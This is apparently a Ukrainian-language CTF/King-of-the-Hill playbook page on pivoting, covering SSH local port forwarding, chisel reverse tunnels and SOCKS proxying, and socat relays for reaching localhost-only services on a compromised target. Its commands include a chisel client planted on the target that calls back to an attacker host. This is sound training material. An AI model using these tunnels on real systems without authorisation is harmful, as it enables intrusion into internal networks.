# Workflow: Pivoting / Port Forwarding

**Для чого:** дотягнутись до сервісу, що слухає тільки на `127.0.0.1` цілі.
**Коли:** `ss -tlnp` показав внутрішній порт (напр. 3306, 8080 на localhost).
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [service-enum](service-enum.md) · [lateral-movement](lateral-movement.md)

---

## Коли це потрібно
```bash
ss -tlnp
# LISTEN 127.0.0.1:3306   ← ззовні недоступний, але з цілі — так
```
Внутрішні сервіси часто містять окремі прапорці/креди (адмінки, БД, другий додаток) — зразок `1nt3rnal_ap1_l0calh0st`.

## Варіант A. SSH local port forward (є SSH-доступ)
```bash
# локальний 13306 → 127.0.0.1:3306 цілі
ssh -L 13306:127.0.0.1:3306 user@$TARGET
# далі локально:
mysql -h 127.0.0.1 -P 13306 -u root -p
```
Кілька портів: `-L 18080:127.0.0.1:8080 -L 13306:127.0.0.1:3306`.

## Варіант B. chisel (немає SSH, але є shell)
```bash
# локально (сервер):
./chisel server -p 9999 --reverse
# на ЦІЛІ (клієнт, залитий через file-transfer):
./chisel client 10.8.N.x:9999 R:13306:127.0.0.1:3306
# звертання локально на 127.0.0.1:13306
```
SOCKS-проксі (весь трафік у внутрішню мережу):
```bash
# ціль:  ./chisel client 10.8.N.x:9999 R:socks
# локально: proxychains (127.0.0.1:1080) → proxychains nmap/curl ...
```

## Варіант C. socat relay (простий одиночний порт)
```bash
# на цілі: прокинути внутрішній 8080 на 0.0.0.0:8081
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080 &
# локально: curl http://$TARGET:8081
```
Відкриває порт назовні — прибрати після себе; не залишати зайвого (правила).

## Після прокидання
Внутрішній сервіс опрацьовується як звичайний → [service-enum](service-enum.md) / [web-enum](web-enum.md), далі flag-hunt.

## Пастки
- chisel-клієнт і сервер мають збігатись версіями.
- Не плутати local (`-L`) і remote (`R:`) напрями.
- Усі внутрішні порти → [tracker](../07-koth-strategy/findings-tracker.md).
